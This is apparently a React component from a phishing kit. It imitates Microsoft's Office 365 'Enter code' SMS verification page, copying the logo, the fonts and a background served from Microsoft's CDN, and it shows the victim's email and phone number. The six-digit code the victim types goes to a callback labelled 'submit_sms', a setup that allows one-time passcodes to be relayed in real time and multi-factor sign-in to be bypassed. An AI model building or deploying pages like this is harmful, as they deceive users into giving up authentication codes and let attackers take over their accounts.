import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface Office365SmsCodePageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const MicrosoftLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24" aria-hidden="true">
    <rect x="0" y="0" width="11" height="11" fill="#F25022" />
    <rect x="12" y="0" width="11" height="11" fill="#7FBA00" />
    <rect x="0" y="12" width="11" height="11" fill="#00A4EF" />
    <rect x="12" y="12" width="11" height="11" fill="#FFB900" />
    <text x="30" y="18" fontFamily="'Segoe UI', Arial, sans-serif" fontSize="15" fill="#737373">Microsoft</text>
  </svg>
);

const Office365SmsCodePage: React.FC<Office365SmsCodePageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const phoneNumber = (data.phoneNumber as string) || (data.phone as string) || 'the phone number ending with the digits you provided';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length !== 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_sms', { code });
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-0 md:p-4"
      style={{
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundColor: '#e9e9e9',
      }}
    >
      <div
        className="bg-white w-full max-w-[440px] px-11 py-11 shadow-md"
        style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}
      >
        <div className="mb-5">
          <MicrosoftLogo />
        </div>
        {email && (
          <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="mr-2 text-[#1b1b1b]"
              aria-label="Back"
            >
              &larr;
            </button>
            <span>{email}</span>
          </div>
        )}
        <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">Enter code</h1>
        <p className="text-sm text-[#1b1b1b] mb-5">
          We texted your phone {phoneNumber}. Please enter the code to sign in.
        </p>
        <form onSubmit={handleSubmit}>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            placeholder="Code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
            maxLength={6}
            autoFocus
            className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
            style={{ borderBottomColor: '#666' }}
          />
          <div className="mt-3">
            <label className="inline-flex items-center text-sm text-[#1b1b1b]">
              <input type="checkbox" className="mr-2" />
              Don&rsquo;t ask me again for 14 days
            </label>
          </div>
          <div className="mt-3 flex flex-col gap-1">
            <button
              type="button"
              onClick={() => onAction('request_alternate_method')}
              className="text-sm text-[#0067b8] hover:underline text-left w-fit"
            >
              Having trouble? Sign in another way
            </button>
            <button
              type="button"
              onClick={() => onAction('more_info')}
              className="text-sm text-[#0067b8] hover:underline text-left w-fit"
            >
              More information
            </button>
          </div>
          <div className="mt-6 flex justify-end">
            <button
              type="submit"
              disabled={code.length !== 6 || submitting}
              className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60 disabled:cursor-not-allowed"
              style={{ backgroundColor: '#0067b8', minWidth: '108px' }}
            >
              {submitting ? 'Verifying\u2026' : 'Verify'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Office365SmsCodePage;
